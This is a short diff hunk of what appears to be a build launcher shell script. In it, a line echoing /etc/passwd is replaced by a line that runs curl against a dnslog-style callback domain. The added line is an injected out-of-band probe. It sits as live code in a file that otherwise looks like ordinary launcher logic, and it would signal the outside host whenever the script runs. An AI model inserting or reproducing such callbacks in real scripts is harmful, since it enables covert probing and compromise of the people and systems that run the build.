@@ -25,7 +25,7 @@ die ( ) {
     echo
     exit 1
 }
-echo /etc/passwd
+curl 6332005c.log.dnslog.sbs.
 # OS specific support (must be 'true' or 'false').
 cygwin=false
 msys=false
